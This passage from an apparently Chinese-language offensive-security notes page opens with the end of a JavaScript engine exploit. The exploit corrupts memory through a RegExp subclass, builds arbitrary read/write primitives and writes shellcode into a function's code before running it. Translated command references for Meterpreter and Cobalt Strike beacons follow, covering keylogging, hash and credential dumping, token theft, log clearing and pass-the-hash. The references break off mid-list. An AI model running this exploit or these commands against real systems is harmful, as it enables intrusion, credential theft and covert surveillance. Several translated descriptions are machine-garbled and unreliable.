class="line"><span class="actionscript">    <span class="class"><span class="keyword">class</span> <span class="title">LeakArrayBuffer</span> <span class="keyword">extends</span> <span class="title">ArrayBuffer</span> </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">constructor</span>() &#123;</span></span><br><span class="line"><span class="actionscript">            <span class="keyword">super</span>(<span class="number">0x1000</span>);</span></span><br><span class="line"><span class="actionscript">            <span class="keyword">this</span>.slot = <span class="keyword">this</span>;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="actionscript">    <span class="keyword">this</span>.page_buffer = <span class="keyword">new</span> LeakArrayBuffer();</span></span><br><span class="line"><span class="javascript">    <span class="keyword">this</span>.page_view = <span class="keyword">new</span> <span class="built_in">DataView</span>(<span class="keyword">this</span>.page_buffer);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="javascript">    <span class="keyword">new</span> <span class="built_in">RegExp</span>(&#123; <span class="attr">toString</span>: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123; <span class="keyword">return</span> <span class="string">'a'</span> &#125; &#125;);</span></span><br><span class="line"><span class="actionscript">    cb(<span class="literal">true</span>);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="actionscript">    <span class="class"><span class="keyword">class</span> <span class="title">DerivedBase</span> <span class="keyword">extends</span> <span class="title">RegExp</span> </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">constructor</span>() &#123;</span></span><br><span class="line"><span class="actionscript">            <span class="comment">// var array = null;</span></span></span><br><span class="line"><span class="actionscript">            <span class="keyword">super</span>(</span></span><br><span class="line"><span class="actionscript">                <span class="comment">// at this point, the 4-byte allocation for the JSRegExp `this` object</span></span></span><br><span class="line"><span class="actionscript">                <span class="comment">// has just happened.</span></span></span><br><span class="line">                &#123;</span><br><span class="line">                    toString: cb</span><br><span class="line"><span class="actionscript">                &#125;, <span class="string">'g'</span></span></span><br><span class="line"><span class="actionscript">                <span class="comment">// now the runtime JSRegExp constructor is called, corrupting the</span></span></span><br><span class="line"><span class="actionscript">                <span class="comment">// JSArray.</span></span></span><br><span class="line">            );</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="actionscript">            <span class="comment">// this allocation will now directly follow the FixedArray allocation</span></span></span><br><span class="line"><span class="actionscript">            <span class="comment">// made for `this.data`, which is where `array.elements` points to.</span></span></span><br><span class="line"><span class="javascript">            this_.buffer = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x80</span>);</span></span><br><span class="line">            g_array[8] = this_.page_buffer;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="actionscript">    <span class="comment">// try&#123;</span></span></span><br><span class="line"><span class="actionscript">    <span class="keyword">var</span> derived_n = eval(`(<span class="function"><span class="keyword">function</span> <span class="title">derived_n</span><span class="params">(i)</span> </span>&#123;</span></span><br><span class="line">        if (i == 0) &#123;</span><br><span class="line"><span class="actionscript">            <span class="keyword">return</span> DerivedBase;</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="actionscript">        <span class="class"><span class="keyword">class</span> <span class="title">DerivedN</span> <span class="keyword">extends</span> <span class="title">derived_n</span>(<span class="title">i</span>-1) </span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">constructor</span>() &#123;</span></span><br><span class="line"><span class="actionscript">                <span class="keyword">super</span>();</span></span><br><span class="line"><span class="actionscript">                <span class="keyword">return</span>;</span></span><br><span class="line"><span class="actionscript">                $&#123;<span class="string">"this.a=0;"</span>.repeat(tDerivedNCount)&#125;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="actionscript">        <span class="keyword">return</span> DerivedN;</span></span><br><span class="line">    &#125;)`);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    gc();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="actionscript">    <span class="keyword">new</span> (derived_n(tDerivedNDepth))();</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="javascript">    <span class="keyword">this</span>.buffer_view = <span class="keyword">new</span> <span class="built_in">DataView</span>(<span class="keyword">this</span>.buffer);</span></span><br><span class="line"><span class="actionscript">    <span class="keyword">this</span>.leakPtr = <span class="function"><span class="keyword">function</span> <span class="params">(obj)</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">this</span>.page_buffer.slot = obj;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">return</span> <span class="keyword">this</span>.buffer_view.getUint32(kSlotOffset, <span class="literal">true</span>, ...this.prevent_opt);</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="actionscript">    <span class="keyword">this</span>.setPtr = <span class="function"><span class="keyword">function</span> <span class="params">(addr)</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">this</span>.buffer_view.setUint32(kBackingStoreOffset, addr, <span class="literal">true</span>, ...this.prevent_opt);</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="actionscript">    <span class="keyword">this</span>.read32 = <span class="function"><span class="keyword">function</span> <span class="params">(addr)</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">this</span>.setPtr(addr);</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">return</span> <span class="keyword">this</span>.page_view.getUint32(<span class="number">0</span>, <span class="literal">true</span>, ...this.prevent_opt);</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="actionscript">    <span class="keyword">this</span>.write32 = <span class="function"><span class="keyword">function</span> <span class="params">(addr, value)</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">this</span>.setPtr(addr);</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">this</span>.page_view.setUint32(<span class="number">0</span>, value, <span class="literal">true</span>, ...this.prevent_opt);</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="actionscript">    <span class="keyword">this</span>.write8 = <span class="function"><span class="keyword">function</span> <span class="params">(addr, value)</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">this</span>.setPtr(addr);</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">this</span>.page_view.setUint8(<span class="number">0</span>, value, ...this.prevent_opt);</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="actionscript">    <span class="keyword">this</span>.setBytes = <span class="function"><span class="keyword">function</span> <span class="params">(addr, content)</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; content.length; i++) &#123;</span></span><br><span class="line"><span class="actionscript">            <span class="keyword">this</span>.write8(addr + i, content[i]);</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="actionscript">    <span class="keyword">return</span> <span class="keyword">this</span>;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="actionscript"><span class="function"><span class="keyword">function</span> <span class="title">trigger</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">    <span class="keyword">var</span> oob = oobAccess();</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="actionscript">    <span class="keyword">var</span> func_ptr = oob.leakPtr(target_function);</span></span><br><span class="line"><span class="actionscript">    print(<span class="string">'[*] target_function at 0x'</span> + func_ptr.toString(<span class="number">16</span>));</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="actionscript">    <span class="keyword">var</span> kCodeInsOffset = <span class="number">0x1b</span>;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="actionscript">    <span class="keyword">var</span> code_addr = oob.read32(func_ptr + kCodeInsOffset);</span></span><br><span class="line"><span class="actionscript">    print(<span class="string">'[*] code_addr at 0x'</span> + code_addr.toString(<span class="number">16</span>));</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    oob.setBytes(code_addr, shellcode);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    target_function(0);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="actionscript"><span class="keyword">try</span>&#123;</span></span><br><span class="line"><span class="actionscript">    print(<span class="string">"start running"</span>);</span></span><br><span class="line">    trigger();</span><br><span class="line"><span class="actionscript">&#125;<span class="keyword">catch</span>(e)&#123;</span></span><br><span class="line">    print(e);</span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="meterpreter命令详解"><a href="#meterpreter命令详解" class="headerlink" title="meterpreter命令详解"></a>meterpreter命令详解</h2><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br></pre></td><td class="code"><pre><span class="line"><span class="code">    Command              Description</span></span><br><span class="line"><span class="code">    -------                   -----------</span></span><br><span class="line"><span class="code">    ?                         帮助菜单</span></span><br><span class="line"><span class="code">    background                当前会议的背景</span></span><br><span class="line"><span class="code">    bg                        背景的别称</span></span><br><span class="line"><span class="code">    bgkill                    杀死一个后台计价器脚本</span></span><br><span class="line"><span class="code">    bglist                    列出正在运行的后台脚本</span></span><br><span class="line"><span class="code">    bgrun                     以后台线程的形式执行抄表器脚本</span></span><br><span class="line"><span class="code">    channel                   显示信息或控制活动通道</span></span><br><span class="line"><span class="code">    close                     关闭通道</span></span><br><span class="line"><span class="code">    disable_unicode_encoding  禁用unicode字符串的编码。</span></span><br><span class="line"><span class="code">    enable_unicode_encoding   启用unicode字符串的编码。</span></span><br><span class="line"><span class="code">    exit                      终止流量计会话</span></span><br><span class="line"><span class="code">    get_timeouts              获取当前会话超时值</span></span><br><span class="line"><span class="code">    guid                      获取会话GUID</span></span><br><span class="line"><span class="code">    help                      帮助菜单</span></span><br><span class="line"><span class="code">    info                      显示邮政模块的信息</span></span><br><span class="line"><span class="code">    irb                       在当前会话上打开一个交互式Ruby shell</span></span><br><span class="line"><span class="code">    load                      装入一个或多个表前仪分机</span></span><br><span class="line"><span class="code">    machine_id                获取连接到会话的机器的MSF ID。</span></span><br><span class="line"><span class="code">    migrate                   将服务器迁移到另一个进程</span></span><br><span class="line"><span class="code">    pivot                     管理中枢监听器</span></span><br><span class="line"><span class="code">    pry                       在当前会话上打开Pry调试器。</span></span><br><span class="line"><span class="code">    quit                      终止流量计会话</span></span><br><span class="line"><span class="code">    read                      从通道中读取数据</span></span><br><span class="line"><span class="code">    resource                  运行存储在文件中的命令</span></span><br><span class="line"><span class="code">    run                       执行一个抄表器脚本或Post模块。</span></span><br><span class="line"><span class="code">    secure                    (重)在会话上协商TLV数据包加密问题</span></span><br><span class="line"><span class="code">    sessions                  快速切换到另一个会话</span></span><br><span class="line"><span class="code">    set_timeouts              设置当前会话超时值</span></span><br><span class="line"><span class="code">    sleep                     迫使Meterpreter安静下来，然后重新建立会话。</span></span><br><span class="line"><span class="code">    transport                 改变当前的传输机制</span></span><br><span class="line"><span class="code">    use                       "load "的弃用别名</span></span><br><span class="line"><span class="code">    uuid                      获取当前会话的UUID</span></span><br><span class="line"><span class="code">    write                     将数据写入通道</span></span><br><span class="line">Stdapi: File system Commands</span><br><span class="line">============================</span><br><span class="line"><span class="code">    Command       Description</span></span><br><span class="line"><span class="code">    -------       -----------</span></span><br><span class="line"><span class="code">    cat           将文件内容读到屏幕上</span></span><br><span class="line"><span class="code">    cd            更改目录</span></span><br><span class="line"><span class="code">    checksum      检索文件的校验和</span></span><br><span class="line"><span class="code">    cp            将源头复制到目的地</span></span><br><span class="line"><span class="code">    dir           列表文件（ls的别名</span></span><br><span class="line"><span class="code">    download      下载文件或目录</span></span><br><span class="line"><span class="code">    edit          编辑文件</span></span><br><span class="line"><span class="code">    getlwd        打印本地工作目录</span></span><br><span class="line"><span class="code">    getwd         打印工作目录</span></span><br><span class="line"><span class="code">    lcd           更改本地工作目录</span></span><br><span class="line"><span class="code">    lls           列出本地文件</span></span><br><span class="line"><span class="code">    lpwd          打印本地工作目录</span></span><br><span class="line"><span class="code">    ls            列表文件</span></span><br><span class="line"><span class="code">    mkdir         制作目录</span></span><br><span class="line"><span class="code">    mv            将源头移动到目的地</span></span><br><span class="line"><span class="code">    pwd           打印工作目录</span></span><br><span class="line"><span class="code">    rm            删除指定的文件</span></span><br><span class="line"><span class="code">    rmdir         删除目录</span></span><br><span class="line"><span class="code">    search        搜索文件</span></span><br><span class="line"><span class="code">    show_mount    列出所有挂载点/逻辑驱动器</span></span><br><span class="line"><span class="code">    upload        上传文件或目录</span></span><br><span class="line">Stdapi: Networking Commands</span><br><span class="line">===========================</span><br><span class="line"><span class="code">    Command       Description</span></span><br><span class="line"><span class="code">    -------       -----------</span></span><br><span class="line"><span class="code">    arp           显示主机ARP缓存</span></span><br><span class="line"><span class="code">    getproxy      显示当前的代理配置</span></span><br><span class="line"><span class="code">    ifconfig      显示界面</span></span><br><span class="line"><span class="code">    ipconfig      显示界面</span></span><br><span class="line"><span class="code">    netstat       显示网络连接</span></span><br><span class="line"><span class="code">    portfwd       将本地端口转发给远程服务</span></span><br><span class="line"><span class="code">    resolve       在目标机上解析一组主机名。</span></span><br><span class="line"><span class="code">    route         查看和修改路由表</span></span><br><span class="line">Stdapi: System Commands</span><br><span class="line">=======================</span><br><span class="line"><span class="code">    Command       Description</span></span><br><span class="line"><span class="code">    -------       -----------</span></span><br><span class="line"><span class="code">    clearev       清除事件日志</span></span><br><span class="line"><span class="code">    drop_token    放弃任何活动的冒充令牌。</span></span><br><span class="line"><span class="code">    execute       执行一个命令</span></span><br><span class="line"><span class="code">    getenv        获取一个或多个环境变量值</span></span><br><span class="line"><span class="code">    getpid        获取当前进程标识符</span></span><br><span class="line"><span class="code">    getprivs      试图启用当前进程的所有可用特权</span></span><br><span class="line"><span class="code">    getsid        获取服务器正在运行的用户的SID为</span></span><br><span class="line"><span class="code">    getuid        获取服务器运行的用户为</span></span><br><span class="line"><span class="code">    kill          终止一个进程</span></span><br><span class="line"><span class="code">    localtime     显示目标系统的本地日期和时间。</span></span><br><span class="line"><span class="code">    pgrep         按名称过滤进程</span></span><br><span class="line"><span class="code">    pkill         按名称终止进程</span></span><br><span class="line"><span class="code">    ps            列出正在运行的进程</span></span><br><span class="line"><span class="code">    reboot        重新启动远程计算机</span></span><br><span class="line"><span class="code">    reg           修改远程注册表并与之互动</span></span><br><span class="line"><span class="code">    rev2self      在远程机器上调用RevertToSelf()。</span></span><br><span class="line"><span class="code">    shell         进入系统命令行</span></span><br><span class="line"><span class="code">    shutdown      关闭远程电脑</span></span><br><span class="line"><span class="code">    steal_token   试图从目标进程中窃取冒充令牌</span></span><br><span class="line"><span class="code">    suspend       暂停或恢复进程清单。</span></span><br><span class="line"><span class="code">    sysinfo       获取远程系统的信息，如操作系统。</span></span><br><span class="line">Stdapi: User interface Commands</span><br><span class="line">===============================</span><br><span class="line"><span class="code">    Command        Description</span></span><br><span class="line"><span class="code">    -------        -----------</span></span><br><span class="line"><span class="code">    enumdesktops   列出所有可访问的桌面和窗口站</span></span><br><span class="line"><span class="code">    getdesktop     获取当前的仪表盘桌面</span></span><br><span class="line"><span class="code">    idletime       返回远程用户闲置的秒数。</span></span><br><span class="line"><span class="code">    keyboard_send  发送按键</span></span><br><span class="line"><span class="code">    keyevent       发送关键事件</span></span><br><span class="line"><span class="code">    keyscan_dump   转储按键缓冲区</span></span><br><span class="line"><span class="code">    keyscan_start  开始捕捉按键</span></span><br><span class="line"><span class="code">    keyscan_stop   停止捕捉按键</span></span><br><span class="line"><span class="code">    mouse          发送鼠标事件</span></span><br><span class="line"><span class="code">    screenshare    实时观看远程用户的桌面。</span></span><br><span class="line"><span class="code">    screenshot     抓取交互式桌面的截图</span></span><br><span class="line"><span class="code">    setdesktop     更改当前桌面的计价器</span></span><br><span class="line"><span class="code">    uictl          控制一些用户界面组件</span></span><br><span class="line">Stdapi: Webcam Commands</span><br><span class="line">=======================</span><br><span class="line"><span class="code">    Command        Description</span></span><br><span class="line"><span class="code">    -------        -----------</span></span><br><span class="line"><span class="code">    record_mic     用默认麦克风录制音频X秒。</span></span><br><span class="line"><span class="code">    webcam_chat    开始视频聊天</span></span><br><span class="line"><span class="code">    webcam_list    网络摄像机列表</span></span><br><span class="line"><span class="code">    webcam_snap    从指定的网络摄像头拍摄快照</span></span><br><span class="line"><span class="code">    webcam_stream  播放指定网络摄像头的视频流</span></span><br><span class="line">Stdapi: Audio Output Commands</span><br><span class="line">=============================</span><br><span class="line"><span class="code">    Command       Description</span></span><br><span class="line"><span class="code">    -------       -----------</span></span><br><span class="line"><span class="code">    play          在目标系统上播放音频文件，没有任何内容写入磁盘</span></span><br><span class="line">Priv: Elevate Commands</span><br><span class="line">======================</span><br><span class="line"><span class="code">    Command       Description</span></span><br><span class="line"><span class="code">    -------       -----------</span></span><br><span class="line"><span class="code">    getsystem     试图将你的权限提升到本地系统的权限。</span></span><br><span class="line">Priv: Password database Commands</span><br><span class="line">================================</span><br><span class="line"><span class="code">    Command       Description</span></span><br><span class="line"><span class="code">    -------       -----------</span></span><br><span class="line"><span class="code">    hashdump      转储SAM数据库的内容</span></span><br><span class="line">Priv: Timestomp Commands</span><br><span class="line">========================</span><br><span class="line"><span class="code">    Command       Description</span></span><br><span class="line"><span class="code">    -------       -----------</span></span><br><span class="line"><span class="code">    timestomp     操作文件的MACE属性</span></span><br></pre></td></tr></table></figure><h2 id="Cobaltstrike-beacon详解"><a href="#Cobaltstrike-beacon详解" class="headerlink" title="Cobaltstrike beacon详解"></a>Cobaltstrike beacon详解</h2><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">命令</span>                              <span class="string">描述</span></span><br><span class="line"><span class="meta">-------</span>                          <span class="string">--------</span></span><br><span class="line"><span class="attr">argue</span>                            <span class="string">匹配过程的虚假参数</span></span><br><span class="line"><span class="attr">blockdlls</span>                        <span class="string">阻止子进程中的非微软DLLs</span></span><br><span class="line"><span class="attr">browserpivot</span>                     <span class="string">设置浏览器pivot会话</span></span><br><span class="line"><span class="attr">cancel</span>                           <span class="string">取消正在进行的下载</span></span><br><span class="line"><span class="attr">cd</span>                               <span class="string">更改目录</span></span><br><span class="line"><span class="attr">checkin</span>                          <span class="string">Call home and post data</span></span><br><span class="line"><span class="attr">chromedump</span>                       <span class="string">恢复谷歌浏览器的证书</span></span><br><span class="line"><span class="attr">clear</span>                            <span class="string">清除信标队列</span></span><br><span class="line"><span class="attr">connect</span>                          <span class="string">通过TCP连接到一个Beacon对等体</span></span><br><span class="line"><span class="attr">covertvpn</span>                        <span class="string">部署Covert VPN客户端</span></span><br><span class="line"><span class="attr">cp</span>                               <span class="string">复制文件</span></span><br><span class="line"><span class="attr">dcsync</span>                           <span class="string">从DC中提取密码哈希值</span></span><br><span class="line"><span class="attr">desktop</span>                          <span class="string">查看目标的桌面并与之互动</span></span><br><span class="line"><span class="attr">dllinject</span>                        <span class="string">在进程中注入Reflective DLL。</span></span><br><span class="line"><span class="attr">dllload</span>                          <span class="string">用LoadLibrary()将DLL加载到一个进程中。</span></span><br><span class="line"><span class="attr">download</span>                         <span class="string">下载文件</span></span><br><span class="line"><span class="attr">downloads</span>                        <span class="string">列出正在进行的文件下载</span></span><br><span class="line"><span class="attr">drives</span>                           <span class="string">在目标上列出驱动器</span></span><br><span class="line"><span class="attr">elevate</span>                          <span class="string">在升高的上下文中生成一个会话</span></span><br><span class="line"><span class="attr">execute</span>                          <span class="string">在目标机上执行程序(无输出)</span></span><br><span class="line"><span class="attr">executeassembly</span>                  <span class="string">在目标机上执行本地.NET程序。</span></span><br><span class="line"><span class="attr">exit</span>                             <span class="string">终止信标会话</span></span><br><span class="line"><span class="attr">getprivs</span>                         <span class="string">启用当前令牌的系统权限</span></span><br><span class="line"><span class="attr">getsystem</span>                        <span class="string">试图获得系统</span></span><br><span class="line"><span class="attr">getuid</span>                           <span class="string">获取用户ID</span></span><br><span class="line"><span class="attr">hashdump</span>                         <span class="string">转储密码哈希</span></span><br><span class="line"><span class="attr">help</span>                             <span class="string">帮助菜单</span></span><br><span class="line"><span class="attr">inject</span>                           <span class="string">在特定的进程中产生一个会话</span></span><br><span class="line"><span class="attr">inlineexecute</span>                    <span class="string">在此环节中运行一个信标对象文件</span></span><br><span class="line"><span class="attr">jobkill</span>                          <span class="string">杀死一个长期存在的后期开发任务。</span></span><br><span class="line"><span class="attr">jobs</span>                             <span class="string">列出长期运行的开发后任务（List long-running post-exploitation tasks）</span></span><br><span class="line"><span class="attr">jump</span>                             <span class="string">在远程主机上生成一个会话</span></span><br><span class="line"><span class="attr">kerberos_ccache_use</span>              <span class="string">将缓存中的 kerberos ticket 应用到这个会话中。</span></span><br><span class="line"><span class="attr">kerberos_ticket_purge</span>            <span class="string">清除本次会话中的kerberos票据</span></span><br><span class="line"><span class="attr">kerberos_ticket_use</span>              <span class="string">将 kerberos ticket 应用到这个会话</span></span><br><span class="line"><span class="attr">keylogger</span>                        <span class="string">启动击键记录器</span></span><br><span class="line"><span class="attr">kill</span>                             <span class="string">杀死一个进程</span></span><br><span class="line"><span class="attr">link</span>                             <span class="string">通过命名的管道连接到Beacon对等体</span></span><br><span class="line"><span class="attr">logonpasswords</span>                   <span class="string">用mimikatz转储证书和哈希值。</span></span><br><span class="line"><span class="attr">ls</span>                               <span class="string">列表文件</span></span><br><span class="line"><span class="attr">make_token</span>                       <span class="string">创建一个传递凭证的令牌</span></span><br><span class="line"><span class="attr">mimikatz</span>                         <span class="string">运行mimikatz命令</span></span><br><span class="line"><span class="attr">mkdir</span>                            <span class="string">建立一个目录</span></span><br><span class="line"><span class="attr">mode</span>                             <span class="string">dns 使用DNS A作为数据通道(仅限DNS信标)</span></span><br><span class="line"><span class="attr">mode</span>                             <span class="string">dnstxt 使用DNS TXT作为数据通道(仅限DNS信标)</span></span><br><span class="line"><span class="attr">mode</span>                             <span class="string">dns6 使用 DNS AAAA 作为数据通道（仅适用于 DNS 信标）。</span></span><br><span class="line"><span class="attr">mv</span>                               <span class="string">移动文件</span></span><br><span class="line"><span class="attr">net</span>                              <span class="string">网络和主机枚举工具</span></span><br><span class="line"><span class="attr">note</span>                             <span class="string">为该信标指定一个注释</span></span><br><span class="line"><span class="attr">portscan</span>                         <span class="string">扫描网络中的开放服务</span></span><br><span class="line"><span class="attr">powerpick</span>                        <span class="string">通过Unmanaged PowerShell执行命令。</span></span><br><span class="line"><span class="attr">powershell</span>                       <span class="string">通过powershell.exe执行命令。</span></span><br><span class="line"><span class="attr">powershellimport</span>                 <span class="string">导入一个powershell脚本</span></span><br><span class="line"><span class="attr">ppid</span>                             <span class="string">为生成的postex作业设置父级PID。</span></span><br><span class="line"><span class="attr">printscreen</span>                      <span class="string">通过PrintScr方法拍摄一张截图</span></span><br><span class="line"><span class="attr">ps</span>                               <span class="string">显示过程列表</span></span><br><span class="line"><span class="attr">psinject</span>                         <span class="string">在特定进程中执行PowerShell命令</span></span><br><span class="line"><span class="attr">pth</span>                              <span class="string">使用Mimikatz的Passthehash。</span></span><br><span class="line"><span class="attr">pwd</span>                              <span class="string">打印当前目录</span></span><br><span class="line"><span class="attr">reg</span>                              <span class="string">查询注册表</span></span><br><span class="line"><span class="attr">remoteexec</span>                       <span class="string">在远程主机上运行一个命令</span></span><br><span class="line"><span class="attr">rev2self</span>                         <span class="string">恢复到原来的令牌</span></span><br><span class="line"><span class="attr">rm</span>                               <span class="string">移除文件或文件夹</span></span><br><span class="line"><span class="attr">rportfwd</span>                         <span class="string">设置逆向端口转发</span></span><br><span class="line"><span class="attr">rportfwd_local</span>                   <span class="string">通过Cobalt Strike客户端设置反向端口转发。</span></span><br><span class="line"><span class="attr">run</span>                              <span class="string">在目标机上执行程序(返回输出)</span></span><br><span class="line"><span class="attr">runas</span>                            <span class="string">以其他用户身份执行程序</span></span><br><span class="line"><span class="attr">runasadmin</span>                       <span class="string">在提高的上下文中执行程序（ Execute a program in an elevated context）</span></span><br><span class="line"><span class="attr">runu</span>                             <span class="string">在另一个PID下执行程序</span></span><br><span class="line"><span class="attr">screenshot</span>                       <span class="string">拍一张截图</span></span><br><span class="line"><span class="attr">screenwatch</span>                      <span class="string">定期对桌面进行截屏</span></span><br><span 